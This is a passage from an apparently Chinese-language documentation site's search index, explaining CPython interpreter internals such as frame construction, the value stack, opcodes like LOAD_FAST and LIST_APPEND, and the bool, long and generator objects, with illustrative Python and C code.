al_EvalCode()\u3002</p> <p>PyEval_EvalCode()\u662f\u6267\u884c\u4e00\u4e2acode\u5bf9\u8c61\u7684\u516c\u5171API\uff0c\u5b83\u4f1a\u5728\u6267\u884c\u6808\u7684\u9876\u90e8\u6784\u5efa\u4e00\u4e2a\u6267\u884cframe\u3002\u4e00\u4e2aframe\u5bf9\u8c61\u7684\u7ed3\u6784\u50cf\u8fd9\u6837:</p> <p></p>"},{"location":"python/interpreter/#frame","title":"\u6784\u5efaframe","text":"<p>\u6784\u5efa\u7b2c\u4e00\u4e2a\u6267\u884cframe\u9700\u8981\u5f88\u591a\u6b65\uff0c\u90fd\u5728_PyEval_EvalCodeWithName()\u65b9\u6cd5\u4e2d\u3002\u5b83\u76843\u4e2a\u53c2\u6570\u901a\u8fc7PyEval_EvalCode()\u4f20\u5165\uff0c\u5373:</p> <ul> <li>_co\uff0cPyCodeObject\u5bf9\u8c61</li> <li>globals\uff0cPyDict\u5bf9\u8c61\uff0c\u5b58\u50a8\u53d8\u91cf\u540d\u53ca\u5b83\u4eec\u7684\u503c</li> <li>locals\uff0cPyDict\u5bf9\u8c61\uff0c\u5b58\u50a8\u53d8\u91cf\u540d\u53ca\u5b83\u4eec\u7684\u503c</li> </ul> <p>\u5176\u4ed6\u53c2\u6570\u90fd\u662f\u53ef\u9009\u7684:</p> <ul> <li>args\uff0cPyTuple\u5bf9\u8c61\uff0c\u987a\u5e8f\u5b58\u50a8\u4e86\u4f4d\u7f6e\u53c2\u6570</li> <li>argcount\uff0c\u4f4d\u7f6e\u53c2\u6570\u7684\u4e2a\u6570</li> <li>kwnames\uff0c\u5217\u8868\uff0c\u5173\u952e\u5b57\u53c2\u6570\u7684\u540d\u79f0</li> <li>kwargs\uff0c\u5217\u8868\uff0c\u5173\u952e\u5b57\u53c2\u6570\u7684\u503c</li> <li>kwcount\uff0c\u5173\u952e\u5b57\u53c2\u6570\u7684\u4e2a\u6570</li> <li>defs\uff0c\u5217\u8868\uff0c\u4f4d\u7f6e\u53c2\u6570\u7684\u9ed8\u8ba4\u503c</li> <li>defcount\uff0c\u4f4d\u7f6e\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u7684\u4e2a\u6570</li> <li>kwdefs\uff0c\u5b57\u5178\uff0c\u5b58\u50a8\u5173\u952e\u5b57\u53c2\u6570\u7684\u9ed8\u8ba4\u503c</li> <li>closure\uff0c\u95ed\u5305\uff0c\u4e4b\u540e\u5408\u5e76\u5230code\u5bf9\u8c61\u7684co_freevars\u5b57\u6bb5</li> <li>name\uff0c\u521b\u5efa\u751f\u6210\u5668\u3001\u534f\u7a0b\u65f6\u4f7f\u7528</li> <li>qualname\uff0c\u521b\u5efa\u751f\u6210\u5668\u3001\u534f\u7a0b\u65f6\u4f7f\u7528</li> </ul> <p>\u5176\u5177\u4f53\u7684\u6b65\u9aa4\u53ef\u5206\u4e3a:</p> <ol> <li>\u6784\u5efa\u7ebf\u7a0b\u72b6\u6001\uff0c\u5728\u6267\u884c\u4e00\u4e2aframe\u4e4b\u524d\uff0c\u9996\u5148\u9700\u8981\u5728\u7ebf\u7a0b\u4e2d\u5f15\u7528\u5b83\u3002CPython\u53ef\u4ee5\u5728\u4e00\u4e2a\u89e3\u91ca\u5668\u4e2d\u968f\u65f6\u8fd0\u884c\u591a\u4e2a\u7ebf\u7a0b\uff0c\u8fd9\u4e9b\u7ebf\u7a0b\u901a\u8fc7\u94fe\u8868\u653e\u5728\u89e3\u91ca\u5668\u72b6\u6001\u4e2d\u3002\u7ebf\u7a0b\u7ed3\u6784\u79f0\u4e3aPyThreadState\uff0c\u5728\u6574\u4e2aceval.c\u4e2d\u6709\u5f88\u591a\u5730\u65b9\u5f15\u7528\u5b83\u3002</li> <li>\u6784\u5efaframes</li> <li>\u5c06\u5173\u952e\u5b57\u53c2\u6570\u8f6c\u6362\u4e3a\u4e00\u4e2a\u5b57\u5178\u3002\u5982\u679c\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\u5305\u542b<code>**kwargs</code>\u5f62\u5f0f\u7684\u5173\u952e\u5b57\u53c2\u6570\uff0c\u5219\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b57\u5178\uff0c\u5e76\u5c06<code>kwargs</code>\u4f5c\u4e3a\u53d8\u91cf\u540d\u6307\u5411\u8be5\u5b57\u5178</li> <li>\u5c06\u4f4d\u7f6e\u53c2\u6570\u8f6c\u6362\u4e3a\u53d8\u91cf\u3002\u5982\u679c\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\u5305\u542b\u4f4d\u7f6e\u53c2\u6570\uff0c\u9700\u8981\u5c06\u5b83\u4eec\u8bbe\u4e3a\u672c\u5730\u5c40\u90e8\u53d8\u91cf\u3002</li> <li>\u6253\u5305\u4f4d\u7f6e\u53c2\u6570\u81f3<code>*args</code>\uff0c\u5982\u679c\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\u5305\u542b\u6709<code>*args</code>\uff0c\u5219\u521b\u5efa\u4e00\u4e2a\u5143\u7ec4\uff0c\u5e76\u5c06<code>args</code>\u4f5c\u4e3a\u5c40\u90e8\u53d8\u91cf\u540d\u6307\u5411\u5b83</li> <li>\u8f7d\u5165\u5173\u952e\u5b57\u53c2\u6570</li> <li>\u6dfb\u52a0\u7f3a\u5931\u7684\u4f4d\u7f6e\u53c2\u6570</li> <li>\u6dfb\u52a0\u7f3a\u5931\u7684\u5173\u952e\u5b57\u53c2\u6570</li> <li>\u95ed\u5305\u4e2d\u7684\u53d8\u91cf\u540d\u79f0\u6dfb\u52a0\u5230code\u5bf9\u8c61\u7684\u81ea\u7531\u53d8\u91cf\u5217\u8868\u4e2d</li> <li>\u521b\u5efa\u751f\u6210\u5668\u3001\u534f\u7a0b\u4ee5\u53ca\u5f02\u6b65\u751f\u6210\u5668</li> </ol> <p>\u6700\u7ec8\uff0c\u8be5\u51fd\u6570\u8c03\u7528PyEval_EvalFrameEx()\u53bb\u6267\u884c\u8fd9\u4e2a\u65b0\u521b\u5efa\u7684frame\u3002</p>"},{"location":"python/interpreter/#frame_1","title":"\u6267\u884cframe","text":"<p>\u5728\u4e4b\u524d\u7684\u7f16\u8bd1\u5668\u548cAST\u5c0f\u8282\u4e2d\uff0c\u6211\u4eec\u77e5\u9053\u4e86code\u5bf9\u8c61\u5305\u542b\u4e86\u4e00\u4e2a\u5f85\u6267\u884c\u7684\u4e8c\u8fdb\u5236\u7f16\u7801\u7684\u5b57\u8282\u7801\uff0c\u4ee5\u53ca\u53d8\u91cf\u5217\u8868\u548c\u7b26\u53f7\u8868\u3002\u5c40\u90e8\u53d8\u91cf\u548c\u5168\u5c40\u53d8\u91cf\u90fd\u662f\u8fd0\u884c\u65f6\u6839\u636e\u51fd\u6570\u3001\u6a21\u5757\u6216\u8005\u4ee3\u7801\u5757\u7684\u8c03\u7528\u65b9\u5f0f\u51b3\u5b9a\u7684\uff0c\u8fd9\u4e9b\u4fe1\u606f\u901a\u8fc7_PyEval_EvalCodeWithName()\u6dfb\u52a0\u5230frame\u4e2d\u3002\u6b64\u5916\uff0cframe\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u7528\u9014\uff0c\u4f8b\u5982\u534f\u7a0b\u88c5\u9970\u5668\uff0c\u5b83\u53ef\u4ee5\u52a8\u6001\u751f\u6210\u4e00\u4e2aframe\u5e76\u628a\u76ee\u6807\u4f5c\u4e3a\u53d8\u91cf\u3002</p> <p>frame\u5728_PyEval_EvalFrameDefault()\u5185\u76843000\u591a\u884c\u4ee3\u7801\u7684\u4e3b\u5faa\u73af\u4e2d\u6267\u884c\u3002\u8fd9\u4e2a\u51fd\u6570\u662f\u6574\u4e2aCPython\u7684\u6838\u5fc3\uff0c\u5b83\u5305\u542b\u4e86\u6570\u5341\u5e74\u7684\u53d8\u5316\uff0c\u5373\u4f7f\u662f\u4e00\u884c\u4ee3\u7801\u7684\u6539\u53d8\u4e5f\u53ef\u80fd\u5bf9\u6574\u4e2aCPython\u7684\u6027\u80fd\u4ea7\u751f\u91cd\u5927\u5f71\u54cd\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u5728Python3.7\u4ee5\u4e0a\u7684\u7248\u672c\u4e2d\u901a\u8fc7\u5728\u5f53\u524d\u7ebf\u7a0b\u542f\u7528\u8ffd\u8e2a\u6765\u8ddf\u8e2a\u6bcf\u4e00\u6b65frame\u7684\u6267\u884c\uff0c\u4f8b\u5982\u5982\u4e0b\u4ee3\u7801\u53ef\u4ee5\u6253\u5370\u6bcf\u4e00\u6b65\u53cd\u6c47\u7f16\u7684opcode\uff0c\u8c03\u7528\u4e86\u54ea\u4e2acode\u5bf9\u8c61\uff0c\u6267\u884c\u81f3\u7b2c\u51e0\u884c\uff0c\u8fd4\u56de\u503c\u662f\u4ec0\u4e48: <pre><code>import sys\nimport dis\nimport traceback\nimport io\n\ndef trace(frame, event, args):\n   frame.f_trace_opcodes = True\n   stack = traceback.extract_stack(frame)\n   pad = \"   \"*len(stack) + \"|\"\n   if event == 'opcode':\n      with io.StringIO() as out:\n         dis.disco(frame.f_code, frame.f_lasti, file=out)\n         lines = out.getvalue().split('\\n')\n         [print(f\"{pad}{l}\") for l in lines]\n   elif event == 'call':\n      print(f\"{pad}Calling {frame.f_code}\")\n   elif event == 'return':\n      print(f\"{pad}Returning {args}\")\n   elif event == 'line':\n      print(f\"{pad}Changing line to {frame.f_lineno}\")\n   else:\n      print(f\"{pad}{frame} ({event} - {args})\")\n   print(f\"{pad}----------------------------------\")\n   return trace\nsys.settrace(trace)\n\n# Run some code for a demo\neval('\"-\".join([letter for letter in \"hello\"])')\n</code></pre></p>"},{"location":"python/interpreter/#_14","title":"\u503c\u6808","text":"<p>\u5728\u6838\u5fc3\u6267\u884c\u5faa\u73af\u903b\u8f91\u5185\uff0c\u4e00\u4e2a\u5b58\u50a8\u503c\u7684\u6808\u88ab\u521b\u5efa\uff0c\u5b83\u5b58\u50a8\u4e86\u4e00\u7ec4\u6307\u9488\u6307\u5411PyObject\u5b9e\u4f8b\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u538b\u6808: <pre><code>PyObject *a = PyLong_FromLong(10);\nPyObject *b = PyLong_FromLong(20);\nPUSH(a);\nPUSH(b);\n</code></pre> \u8fd0\u884c\u524d\u540e\u5982\u56fe:  \u6709\u5f88\u591a\u5b57\u8282\u64cd\u4f5c\u7801opcode\u662f\u76f4\u63a5\u64cd\u4f5c\u6808\u7684\uff0c\u4f8b\u5982PUSH()\u3001POP()\u3001PEEK()\u3001DUP_TOP()\u3001ROT_TWO()\u7b49\u3002\u6240\u6709\u7684opcode\u90fd\u4f1a\u5bf9\u6808\u6709\u4e00\u4e2a\u5f71\u54cd\uff0c\u8fd9\u88ab\u5b9a\u4e49\u5728stack_effect()\u65b9\u6cd5\u4e2d\u3002</p> <p>\u4e3e\u4f8b:\u5411list\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u5143\u7d20</p> <p>\u5728Python\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7append()\u65b9\u6cd5\u6dfb\u52a0\u5143\u7d20: <pre><code>my_list = []\nmy_list.append(obj)\n</code></pre> \u5728CPython\u4e2d\uff0c\u8fd9\u4e2a\u64cd\u4f5c\u5bf9\u5e94\u7740\u4e24\u4e2a\u64cd\u4f5c\u3002LOAD_FAST\u5c06\u5bf9\u8c61obj\u4eceframe\u7684\u5c40\u90e8\u53d8\u91cf\u5217\u8868\u4e2d\u52a0\u8f7d\u5230\u503c\u6808\u7684\u9876\u90e8\uff0c\u7136\u540eLIST_APPEND\u64cd\u4f5c\u6dfb\u52a0\u8fd9\u4e2a\u5bf9\u8c61\u81f3list\u4e2d\u3002\u6211\u4eec\u5148\u6765\u770bLOAD_FAST: <pre><code> ... \n    case TARGET(LOAD_FAST): {\n        // \u53d8\u91cf\u7684\u6307\u9488\u90fd\u5b58\u50a8\u5728fastlocals\u533a\u57df\uff0c\u5b83\u662fPyFrame\u7684f_localsplus\u7684\u62f7\u8d1d\u3002\n        // oparg\u662ffastlocals\u6570\u7ec4\u7684\u7d22\u5f15\uff0c\u4e5f\u5c31\u662f\u67e5\u627e\u5c40\u90e8\u53d8\u91cf\u662f\u4e0d\u9700\u8981\u6839\u636e\u53d8\u91cf\u540d\u79f0\u6765\u67e5\u627e\u7684\u3002\n        PyObject *value = GETLOCAL(oparg);                 \n        if (value == NULL) {\n            format_exc_check_arg(\n                PyExc_UnboundLocalError,\n                UNBOUNDLOCAL_ERROR_MSG,\n                PyTuple_GetItem(co-&gt;co_varnames, oparg));\n            // \u5982\u679c\u53d8\u91cf\u4e0d\u5b58\u5728\uff0c\u5219\u5f15\u53d1\u672a\u7ed1\u5b9a\u5c40\u90e8\u53d8\u91cf\u7684\u9519\u8bef\n            goto error;                                    \n        }\n        // \u589e\u52a0value(\u8fd9\u91cc\u5c31\u662fobj)\u7684\u5f15\u7528\u8ba1\u6570\n        Py_INCREF(value);  \n        // \u628aobj\u7684\u6307\u9488\u538b\u5165\u503c\u6808                               \n        PUSH(value);      \n        // \u5982\u679c\u542f\u7528\u4e86trace\uff0c\u5219\u5faa\u73af\u518d\u6b21\u904d\u5386(\u5e26\u7740\u6240\u6709\u7684tracing)\uff1b\u5982\u679c\u6ca1\u542f\u7528\uff0c\u5219\u8df3\u56de\u5faa\u73af\u9876\u90e8\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4                                 \n        FAST_DISPATCH();                                   \n    }\n ...\n</code></pre> \u63a5\u7740\uff0cLIST_APPEND\u662f\u901a\u8fc7POP()\u83b7\u53d6\u5230\u5143\u7d20obj\u7684\u6307\u9488\uff0cPEEK(oparg)\u83b7\u53d6\u5230my_list\u7684\u6307\u9488\uff0c\u7136\u540e\u4f7f\u7528CPython\u5217\u8868\u7684C\u7684API\u5373PyList_Append()\u5c06\u5143\u7d20\u6dfb\u52a0\u8fdb\u53bb\u7684: <pre><code> ...\n        case TARGET(LIST_APPEND): {\n            PyObject *v = POP();\n            PyObject *list = PEEK(oparg);\n            int err;\n            err = PyList_Append(list, v);\n            Py_DECREF(v);\n            if (err != 0)\n                goto error;\n            PREDICT(JUMP_ABSOLUTE);\n            DISPATCH();\n        }\n ...\n</code></pre> \u5176\u540e\u7684PREDICT(JUMP_ABSOLUTE)\u5c5e\u4e8e\u4e00\u79cd\u9884\u6d4b\u624b\u6bb5\uff0c\u5b83\u4f1a\u731c\u4e0b\u4e00\u4e2aopcode\u53ef\u80fd\u662fJUMP_ABSOLUTE\uff0c\u8fd9\u6837CPU\u5c31\u53ef\u4ee5\u76f4\u63a5\u8df3\u8f6c\u8fc7\u53bb\u800c\u4e0d\u9700\u8981\u91cd\u65b0\u8dd1\u4e00\u904d\u4e3b\u5faa\u73af\u4e86\u3002</p> <p>\u8c03\u7528\u8ffd\u8e2a</p> <p>\u6709\u4e00\u4e9b\u6307\u4ee4\u4f8b\u5982CALL_FUNCTION\u3001CALL_METHOD\uff0c\u5b83\u4eec\u7684\u53c2\u6570opcode\u5b9e\u9645\u4e0a\u662f\u53e6\u4e00\u4e2a\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u51fd\u6570\u3002\u90a3\u4e48\u53e6\u4e00\u4e2aframe\u5c31\u4f1a\u538b\u5165\u5f53\u524d\u7ebf\u7a0b\u7684\u6267\u884c\u6808\u5e27\u4e2d\uff0c\u4e3b\u5faa\u73af\u4f1a\u5148\u628a\u8fd9\u4e2a\u65b0\u7684\u51fd\u6570\u8fd0\u884c\u5b8c\u4ee5\u540e\u5728\u8fd0\u884c\u539f\u51fd\u6570\u3002\u6bcf\u6b21\u65b0\u7684frame\u521b\u5efa\u65f6\uff0c\u5b83\u4f1a\u6709\u4e00\u4e2af_back\u5c5e\u6027\u5c31\u662f\u6307\u5411\u5f53\u524d\u7684frame\u3002</p> <p>\u4f8b\u5982\u6709\u8fd9\u6837\u4e00\u6bb5python\u4ee3\u7801: example_stack.py<pre><code>def function2():\n  raise RuntimeError\ndef function1():\n  function2()\nif __name__ == '__main__':\n  function1()\n</code></pre> \u5b83\u8fd0\u884c\u540e: <pre><code>$ ./python.exe example_stack.py\n\nTraceback (most recent call last):\n  File \"example_stack.py\", line 8, in &lt;module&gt;\n    function1()\n  File \"example_stack.py\", line 5, in function1\n    function2()\n  File \"example_stack.py\", line 2, in function2\n    raise RuntimeError\nRuntimeError\n</code></pre> \u8fd9\u4e9b\u8c03\u7528\u8ffd\u8e2a\u4fe1\u606f\uff0c\u5b9e\u9645\u4e0a\u53ef\u4ee5\u901a\u8fc7\u6807\u51c6\u5e93traceback\u7684walk_stack()\u51fd\u6570\u5f97\u5230: <pre><code>def walk_stack(f):\n    \"\"\"Walk a stack yielding the frame and line number for each frame.\n    This will follow f.f_back from the given frame. If no frame is given, the\n    current stack is used. Usually used with StackSummary.extract.\n    \"\"\"\n    if f is None:\n        f = sys._getframe().f_back.f_back\n    while f is not None:\n        yield f, f.f_lineno\n        f = f.f_back\n</code></pre> \u5b83\u5148\u901a\u8fc7Python\u7684API\u5373sys._getframe()\u5f97\u5230\u5f53\u524d\u7684frame\uff0c\u7136\u540e\u627e\u5b83\u7684f_back.f_back\u662f\u4e3a\u4e86\u8df3\u8fc7\u5176\u672c\u8eabwalk_stack()\u51fd\u6570\u548c\u5176\u7236\u4eb2print_trace()\u51fd\u6570\u3002</p> <p>\u7528\u56fe\u5f62\u6765\u8868\u8fbe\u8fd9\u4e2a\u8c03\u7528\u8ffd\u8e2a\u5173\u7cfb\u5c31\u662f: </p>"},{"location":"python/interpreter/#cpython_1","title":"CPython\u4e2d\u7684\u5bf9\u8c61","text":"<p>\u5728Python\u91cc\u6240\u6709\u7684\u5bf9\u8c61\u7ee7\u627f\u81ea<code>object</code>\uff0c\u4f46\u5728C\u91cc\uff0c\u7531\u4e8eC\u6ca1\u6709\u9762\u5411\u5bf9\u8c61\u7684\u7279\u6027\uff0c\u6211\u4eec\u770b\u5230\u7684\u90fd\u662f\u5bf9<code>PyObject*</code>\u7684\u5f15\u7528\uff0cPyObject\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2aPython\u5bf9\u8c61\u5185\u5b58\u8d77\u59cb\u5904\u7684\u6570\u636e\u7ed3\u6784\u3002</p>"},{"location":"python/interpreter/#_15","title":"\u57fa\u7840\u5bf9\u8c61","text":"<p>\u4e00\u4e2aPython\u5bf9\u8c61\u53ef\u4ee5\u8ba4\u4e3a\u662f\u7531\u4e24\u90e8\u5206\u7ec4\u6210\u7684: 1. \u6838\u5fc3\u6570\u636e\u6a21\u578b\uff0c\u5e26\u6709\u6307\u5411\u5176\u5df2\u7f16\u8bd1\u7684\u65b9\u6cd5\u7684\u6307\u9488 2. \u5305\u542b\u81ea\u5b9a\u4e49\u5c5e\u6027\u548c\u65b9\u6cd5\u7684\u5b57\u5178</p> <p>\u6838\u5fc3\u6570\u636e\u6a21\u578b\u662f\u5728PyTypeObject\u4e2d\u5b9a\u4e49\u7684\uff0c\u800c\u5b83\u4eec\u7684\u65b9\u6cd5\u662f\u5728\u5982\u4e0b\u4f4d\u7f6e\u5b9a\u4e49\u7684:</p> \u6587\u4ef6\u540d \u7c7b\u578b Objects/object.c \u5185\u7f6e\u7c7b\u578b Objects/boolobject.c bool Objects/bytearrayobject.c byte[] Objects/bytesobjects.c bytes Objects/classobject.c \u5143\u7f16\u7a0b\u7684\u62bd\u8c61\u7c7b Objects/complexobject.c \u590d\u6570 Objects/iterobject.c \u8fed\u4ee3\u5668 Objects/listobject.c \u5217\u8868 Objects/longobject.c \u957f\u6574\u6570 Objects/memoryobject.c \u57fa\u7840\u5185\u5b58\u7c7b\u578b Objects/methodobject.c \u7c7b\u65b9\u6cd5 Objects/moduleobject.c \u6a21\u5757 Objects/namespaceobject.c \u540d\u5b57\u7a7a\u95f4 Objects/odictobject.c \u6709\u5e8f\u5b57\u5178 Objects/rangeobject.c range\u751f\u6210\u5668 Objects/setobject.c set Objects/sliceobject.c \u5207\u7247 Objects/structseq.c struct.Struct\u4e8c\u8fdb\u5236 Objects/tupleobject.c \u5143\u7ec4 Objects/typeobject.c type\u7c7b Objects/unicodeobject.c str Objects/weakrefobject.c \u5f31\u5f15\u7528"},{"location":"python/interpreter/#_16","title":"\u5e03\u5c14\u548c\u6574\u6570","text":"<p>\u5e03\u5c14\u7c7b\u662f\u5185\u7f6e\u7c7b\u578b\u4e2d\u6700\u76f4\u63a5\u7684\u5b9e\u73b0\uff0c\u5b83\u7ee7\u627f\u81ealong\uff0c\u5e76\u5728\u89e3\u91ca\u5668\u4e2d\u521b\u5efa\u4e86\u5e38\u91cfPy_True\u548cPy_False\u3002\u5728Objects/boolobject.c\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5e2e\u52a9\u51fd\u6570\u901a\u8fc7\u6570\u5b57\u6765\u521b\u5efa\u5e03\u5c14\u7c7b\u578b\u7684\u5b9e\u4f8b: <pre><code>PyObject *PyBool_FromLong(long ok)\n{\n    PyObject *result;\n    if (ok)\n        result = Py_True;\n    else\n        result = Py_False;\n    Py_INCREF(result);\n    return result;\n}\n</code></pre> \u6b64\u5916\uff0c\u4e5f\u5b9e\u73b0\u4e86\u4e00\u4e9band\u3001xor\u3001or\u4e4b\u7c7b\u7684\u5e2e\u52a9\u51fd\u6570\uff0c\u4f46\u52a0\u6cd5\u3001\u51cf\u6cd5\u3001\u9664\u6cd5\u662f\u6ca1\u6709\u4ece\u7ee7\u627f\u7684long\u4e2d\u5b9e\u73b0\u7684\u3002</p> <p>\u68c0\u6d4b<code>a and b</code>\u7684\u7ed3\u679c\u662f\u5148\u68c0\u6d4ba\u548cb\u662f\u5426\u4e3a\u5e03\u5c14\u503c\uff0c\u7136\u540e\u68c0\u67e5\u5b83\u4eec\u662f\u5426\u6709\u5bf9Py_True\u7684\u5f15\u7528\uff0c\u90fd\u4e0d\u662f\u7684\u8bdd\u5219\u628a\u5b83\u4eec\u5f3a\u5236\u8f6c\u5316\u4e3a\u6570\u5b57\u8fdb\u884c\u6570\u5b57\u4e4b\u95f4\u7684and\u64cd\u4f5c: <pre><code>static PyObject *bool_and(PyObject *a, PyObject *b)\n{\n    if (!PyBool_Check(a) || !PyBool_Check(b))\n        return PyLong_Type.tp_as_number-&gt;nb_and(a, b);\n    return PyBool_FromLong((a == Py_True) &amp; (b == Py_True));\n}\n</code></pre></p> <p>long\u7c7b\u578b\u4f1a\u590d\u6742\u4e00\u4e9b\uff0c\u56e0\u4e3a\u5b83\u9700\u8981\u66f4\u5927\u7684\u5185\u5b58\u3002Python3\u5df2\u7ecf\u820d\u5f03\u6389\u4e86Python2\u4e2d\u5bf9int\u7c7b\u578b\u7684\u652f\u6301\uff0c\u800c\u662f\u90fd\u4f7f\u7528long\u7c7b\u578b\uff0c\u800clong\u53c8\u975e\u5e38\u7279\u6b8a\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u5b58\u50a8\u7684\u662f\u4e00\u4e2a\u53d8\u957f\u6574\u6570\u3002\u5b83\u7684\u7ed3\u6784\u7531\u4e00\u4e2aPyObject\u7684\u5934\u90e8\u548c\u4e00\u4e2a\u6570\u5b57\u7684\u5217\u8868\u7ec4\u6210\uff0c\u6570\u5b57\u5217\u8868\u4e00\u5f00\u59cb\u8bbe\u7f6e\u4e3a\u53ea\u67091\u4e2a\u6570\u5b57\uff0c\u4f46\u521d\u59cb\u5316\u4e4b\u540e\u4f1a\u8c03\u7528 _PyLong_New()\u65b9\u6cd5\u91cd\u65b0\u5206\u914d\u5185\u5b58\uff0c\u5e76\u8c03\u6574\u4e3a\u4e00\u4e2a\u66f4\u5927\u7684\u957f\u5ea6: <pre><code>struct _longobject {\n    PyObject_VAR_HEAD\n    digit ob_digit[1];\n};\n</code></pre></p> <p>\u8981\u5c06C\u8bed\u8a00\u7684long\u7c7b\u578b\u8f6c\u6362\u4e3aPython\u4e2d\u7684long\u7c7b\u578b\uff0c\u9700\u8981\u5148\u5c06C\u4e2d\u7684long\u8f6c\u6362\u4e3a\u4e00\u4e2a\u6570\u5b57\u5217\u8868\uff0c\u5206\u914dPython\u4e2dlong\u9700\u8981\u7684\u5185\u5b58\uff0c\u7136\u540e\u53bb\u8bbe\u7f6e\u6bcf\u4e2a\u6570\u5b57: <pre><code>PyObject *\nPyLong_FromLong(long ival)\n{\n    PyLongObject *v;\n    unsigned long abs_ival;\n    unsigned long t;  /* unsigned so &gt;&gt; doesn't propagate sign bit */\n    int ndigits = 0;\n    int sign;\n    CHECK_SMALL_INT(ival);\n...\n    /* \u5bf9\u4e8e\u4e00\u4e2a\u4f4d\u7684\u6574\u6570\u53ef\u4ee5\u5feb\u901f\u5904\u7406\u4e0d\u9700\u5206\u914d\u5185\u5b58 */\n    if (!(abs_ival &gt;&gt; PyLong_SHIFT)) {\n        v = _PyLong_New(1);\n        if (v) {\n            Py_SIZE(v) = sign;\n            v-&gt;ob_digit[0] = Py_SAFE_DOWNCAST(\n                abs_ival, unsigned long, digit);\n        }\n        return (PyObject*)v;\n    }\n...\n    /* \u5bf9\u4e8e\u5927\u4e00\u4e9b\u7684\u6570\uff0c\u5148\u5faa\u73af\u786e\u5b9a\u6709\u591a\u5c11\u4f4d */\n    t = abs_ival;\n    while (t) {\n        ++ndigits;\n        t &gt;&gt;= PyLong_SHIFT;\n    }\n    v = _PyLong_New(ndigits);\n    if (v != NULL) {\n        digit *p = v-&gt;ob_digit;\n        Py_SIZE(v) = ndigits*sign;\n        t = abs_ival;\n        while (t) {\n            *p++ = Py_SAFE_DOWNCAST(\n                t &amp; PyLong_MASK, unsigned long, digit);\n            t &gt;&gt;= PyLong_SHIFT;\n        }\n    }\n    return (PyObject *)v;\n}\n</code></pre> \u6b64\u5916\uff0c\u5c06\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3aPython\u4e2d\u7684long\u4ee5\u53caUnicode\u8fdb\u884c\u8f6c\u6362\u90fd\u5728<code>longobject.c</code>\u4e2d\u6709\u76f8\u5e94\u7684\u65b9\u6cd5\u3002</p>"},{"location":"python/interpreter/#_17","title":"\u751f\u6210\u5668\u7c7b\u578b","text":"<p>Python\u4e2d\u7684\u751f\u6210\u5668\u662f\u6307\u4f7f\u7528yield\uff0c\u901a\u8fc7\u8fde\u7eed\u7684\u8c03\u7528\u4ee5\u751f\u6210\u66f4\u591a\u7684\u503c\u3002\u901a\u5e38\u7528\u4e8e\u8f83\u5927\u7684\u6570\u636e\u5757\u4e2d\u6765\u8d77\u5230\u8282\u7ea6\u5185\u5b58\u3001\u63d0\u5347\u6548\u7387\u7684\u4f5c\u7528\u3002\u5982: <pre><code>&gt;&gt;&gt; def example():\n...   lst = [1,2,3,4]\n...   for i in lst:\n...     yield i\n&gt;&gt;&gt; gen = example()\n&gt;&gt;&gt; gen\n&lt;generator object example at 0x100bcc480&gt;\n</code></pre> \u6211\u4eec\u6df1\u5165\u63a2\u7d22\u751f\u6210\u5668\u5bf9\u8c61\uff0c\u53d1\u73b0\u5b83\u6709\u4e00\u4e9bgi_\u5f00\u5934\u7684\u5c5e\u6027: <pre><code>&gt;&gt;&gt; dir(gen)\n[ ...\n 'close', \n 'gi_code', \n 'gi_frame', \n 'gi_running', \n 'gi_yieldfrom', \n 'send', \n 'throw']\n</code></pre> \u5728CPython\u4e2d\uff0c\u751f\u6210\u5668\u7c7b\u578b\u6709\u4e09\u79cd\uff0c\u5b9a\u4e49\u5728<code>Include/genobject.h</code>\u7684PyGenObject\u7c7b\u578b\u4e2d\uff0c\u5373Generator objects\u3001Coroutine objects\u548cAsync generator objects\u3002\u5b83\u4eec\u5171\u4eab\u4e00\u4e9b\u5b57\u6bb5\u5e76\u4e14\u4e5f\u6709\u76f8\u4f3c\u7684\u884c\u4e3a\u903b\u8f91:  \u6211\u4eec\u4ee5PyGenObject\u4e3a\u4f8b\u770b\u770b\u8fd9\u4e9b\u5b57\u6bb5\u7684\u7528\u9014: * gi_frame\uff0c\u94fe\u63a5\u81f3\u4e00\u4e2aPyFrameObject\u5bf9\u8c61\uff0c\u8fd9\u662f\u751f\u6210\u5668\u5982\u4f55\u8bb0\u4f4f\u4e0a\u6b21\u6267\u884c\u7684\u672c\u5730\u53d8\u91cf\u7684\u5173\u952e * gi_running\uff0c\u8bbe\u7f6e\u4e3a0\u62161\u6765\u5224\u65ad\u5f53\u524d\u751f\u6210\u5668\u662f\u5426\u5728\u6267\u884c * gi_code\uff0c\u94fe\u63a5\u81f3\u4e00\u4e2aPyCodeObject\u5bf9\u8c61\uff0c\u5b83\u6301\u6709\u7f16\u8bd1\u597d\u7684\u65b9\u6cd5\u4fbf\u4e8e\u4e4b\u540e\u518d\u6b21\u8c03\u7528 * gi_weakreflist\uff0c\u94fe\u63a5\u81f3\u751f\u6210\u5668\u51fd\u6570\u5185\u90e8\u7684\u5f31\u5f15\u7528\u5217\u8868 * gi_name\uff0c\u751f\u6210\u5668\u7684\u540d\u79f0 * gi_qualname\uff0c\u751f\u6210\u5668\u7684\u9650\u5b9a\u540d\u79f0 * gi_exc_state\uff0c\u662f\u4e00\u4e2a\u5b58\u50a8\u5f02\u5e38\u7684\u5143\u7ec4\uff0c\u5b58\u50a8\u751f\u6210\u5668\u8c03\u7528\u8fc7\u7a0b\u4e2d\u7684\u5f02\u5e38</p> 